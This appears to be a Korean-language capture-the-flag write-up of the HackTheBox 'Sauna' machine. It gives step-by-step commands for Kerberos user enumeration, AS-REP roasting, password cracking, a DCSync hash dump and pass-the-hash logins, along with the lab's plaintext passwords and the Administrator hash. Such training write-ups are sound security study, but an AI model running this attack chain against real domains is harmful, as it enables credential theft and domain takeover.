# Sauna - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,3268,3269,389,445,464,49669,49673,49674,49677,49695,53,593,5985,636,80,88,9389 -sC -sV -vv -oA sauna 10.10.10.175
```
<img width="1104" height="448" alt="image" src="https://github.com/user-attachments/assets/1c3424ea-525d-4cea-882b-7061c57ef39a" />

- HTTP(80)
- KERBEROS(88)
- LDAP(389)
- SMB(445)
- WINRM(5985)

<br>

- `/etc/hosts`에 `egotistical-bank.local` 추가.
<img width="1104" height="63" alt="image" src="https://github.com/user-attachments/assets/1dc0e641-eec4-480a-b6ea-7998878d1e56" />

---
## HTTP
### banner grabbing
<img width="1105" height="313" alt="image" src="https://github.com/user-attachments/assets/0a1404d6-8b22-4c76-8228-ebcd0d13ff8d" />

### User List
- 서버 자체에서 특별한 정보는 찾을 수 없으나, `/about.html`에서 서버에 존재하는 유저들의 목록이라고 판단.
<img width="830" height="902" alt="image" src="https://github.com/user-attachments/assets/1cb29863-0710-4430-ad46-09f2caca3d53" />

<br>
<br>

- https://github.com/urbanadventurer/username-anarchy
- 이름들을 변형을 준 리스트를 생성.
```bash
~/util/username-anarchy/username-anarchy -i users > users.txt
```
<img width="1103" height="242" alt="image" src="https://github.com/user-attachments/assets/d110fce8-1274-45e1-ac78-cbde016c55a3" />

---
## KERBEROS
- `kerbrute`를 사용하여 존재하는 유저 탐색.
- `fsmith`유저 발견.
```bash
./kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d egotistical-bank.local users.txt
```
<img width="1103" height="321" alt="image" src="https://github.com/user-attachments/assets/38b12e83-9a53-495f-bda2-53539f7ff49f" />

<br>
<br>

- 비밀번호를 모르는 상태에서 `AS-REP Roasting`공격 시도.
```bash
impacket-GetNPUsers -dc-ip 10.10.10.175 -no-pass egotistical-bank.local/fsmith
```
<img width="1103" height="223" alt="image" src="https://github.com/user-attachments/assets/be71566b-277b-4cee-8d8a-390c08964b26" />

<br>
<br>

- 크래킹.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1103" height="223" alt="image" src="https://github.com/user-attachments/assets/3e7d3fa8-c8c7-495e-81aa-ab55640cae9b" />

---
## WINRM
- `fsmith:Thestrokes23`로 접속 가능.
```bash
netexec winrm 10.10.10.175 -u fsmith -p Thestrokes23
```
<img width="1103" height="175" alt="image" src="https://github.com/user-attachments/assets/93110cca-2201-4609-86f3-487e02e296f9" />

<br>
<br>

- `WINRM` 접속.
```bash
evil-winrm -i 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
```
<img width="1103" height="273" alt="image" src="https://github.com/user-attachments/assets/09c42acf-c488-4b98-a89a-279f163b6b28" />

---
## Privesc
- 특별한 정보를 찾지 못하여 `winpeas`를 실행시켜 `svc_loanmanager`의 비밀번호를 발견.
```powershell
.\winpeasx64.exe
```
<img width="1103" height="120" alt="image" src="https://github.com/user-attachments/assets/b04a18b7-eb01-494b-991c-cd3fa35bcded" />

<br>
<br>

- `svc_loanmanager:Moneymakestheworldgoround!`로그인은 불가능.
<img width="1103" height="187" alt="image" src="https://github.com/user-attachments/assets/23d9bf3d-99ea-4e93-96c8-caaaf236eca8" />

<br>
<br>

- `SharpHound`를 사용하여 도메인 정보 수집하여 다운로드.
```
.\sharphound.exe

*Evil-WinRM* PS C:\temp> download 20260107083748_BloodHound.zip
```
<img width="1104" height="106" alt="image" src="https://github.com/user-attachments/assets/b993383c-d088-461d-bba1-c0628c9136aa" />

<br>
<br>

- `egotistical-bank.local`로 `DCSync`공격을 실행해 `administrator`를 획득할 수 있다.
<img width="1311" height="771" alt="image" src="https://github.com/user-attachments/assets/8ff6d477-6f92-4c82-9b86-13a824cf5bc3" />

<br>
<br>

- `Administrator` 해시 획득.
```bash
impacket-secretsdump 'egotistical-bank.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@10.10.10.175
```
<img width="1104" height="159" alt="image" src="https://github.com/user-attachments/assets/a0a545e2-ba13-4b92-9459-91e0b64961d1" />

<br>
<br>

- `Administrator:823452073d75b9d1cf70ebdf86c7f98e` 로그인 시도.
<img width="1104" height="233" alt="image" src="https://github.com/user-attachments/assets/b3f6e30e-e433-4cfc-93ad-a8248747fd22" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.10.10.175 -u 'administrator' -H '823452073d75b9d1cf70ebdf86c7f98e'
```
<img width="1104" height="276" alt="image" src="https://github.com/user-attachments/assets/aa8d9f42-ef0d-4500-ba1b-cc8ef5196c76" />

---
## FLAG
- `c:\users\fsmith\desktop\user.txt`
<img width="1104" height="189" alt="image" src="https://github.com/user-attachments/assets/00341e42-e8e8-4567-9133-9c437869aa13" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1104" height="189" alt="image" src="https://github.com/user-attachments/assets/d152100b-f5a1-416e-b384-4f428e4ad783" />


















